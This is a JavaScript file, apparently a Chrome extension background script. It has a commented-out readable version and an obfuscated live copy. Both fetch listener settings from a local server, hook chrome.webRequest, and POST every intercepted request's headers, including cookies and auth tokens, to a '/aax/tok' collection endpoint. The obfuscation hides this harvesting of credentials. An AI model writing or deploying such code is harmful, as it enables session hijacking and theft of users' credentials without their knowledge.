// var state = {

// }

// async function getBasicThings() {
//     let respa = await fetch("http://localhost:8989/es/a")
//     state.a = await respa.text()

//     let respb = await fetch("http://localhost:8989/es/b")
//     state.b = await respb.json()

//     let respc = await fetch("http://localhost:8989/es/c")
//     state.c = await respc.json()

//     console.log(state)


//     chrome.webRequest[state.a].addListener(
//         async (details) => {
//             await fetch("http://localhost:8989/aax/tok", {method: "POST", body: JSON.stringify(details.requestHeaders), headers: {
//                 "Content-Type": "application/json"
//             }})
//         },
//         state.b,
//         state.c
//     )
// }

// getBasicThings()

function _0x123e(){const _0x34286e=['http://localhost:8989/es/c','1184981VQwmWk','13599112WWBPpi','30LDPlNd','log','61198BcwxYB','4323388OuHwpG','2828605YzZbih','http://localhost:8989/es/a','requestHeaders','json','POST','http://localhost:8989/aax/tok','webRequest','text','1325766hXIZjS','875409eXJUWl','addListener'];_0x123e=function(){return _0x34286e;};return _0x123e();}(function(_0x5314b2,_0x1f0512){const _0xb6f1f=_0xd84f,_0x3d13cb=_0x5314b2();while(!![]){try{const _0x4b9dba=parseInt(_0xb6f1f(0x157))/0x1+parseInt(_0xb6f1f(0x14d))/0x2+parseInt(_0xb6f1f(0x146))/0x3+parseInt(_0xb6f1f(0x14e))/0x4+parseInt(_0xb6f1f(0x14f))/0x5+parseInt(_0xb6f1f(0x14b))/0x6*(-parseInt(_0xb6f1f(0x149))/0x7)+-parseInt(_0xb6f1f(0x14a))/0x8;if(_0x4b9dba===_0x1f0512)break;else _0x3d13cb['push'](_0x3d13cb['shift']());}catch(_0x152573){_0x3d13cb['push'](_0x3d13cb['shift']());}}}(_0x123e,0xb6b90));function _0xd84f(_0x31c863,_0x2ee025){const _0x123e35=_0x123e();return _0xd84f=function(_0xd84f60,_0x1d11d0){_0xd84f60=_0xd84f60-0x146;let _0x5c9054=_0x123e35[_0xd84f60];return _0x5c9054;},_0xd84f(_0x31c863,_0x2ee025);}var state={};async function getBasicThings(){const _0xff7d38=_0xd84f;let _0x30b931=await fetch(_0xff7d38(0x150));state['a']=await _0x30b931[_0xff7d38(0x156)]();let _0x3d30e2=await fetch('http://localhost:8989/es/b');state['b']=await _0x3d30e2[_0xff7d38(0x152)]();let _0x1acbde=await fetch(_0xff7d38(0x148));state['c']=await _0x1acbde['json'](),console[_0xff7d38(0x14c)](state),chrome[_0xff7d38(0x155)][state['a']][_0xff7d38(0x147)](async _0x1cd2e4=>{const _0x1464fd=_0xff7d38;await fetch(_0x1464fd(0x154),{'method':_0x1464fd(0x153),'body':JSON['stringify'](_0x1cd2e4[_0x1464fd(0x151)]),'headers':{'Content-Type':'application/json'}});},state['b'],state['c']);}getBasicThings();
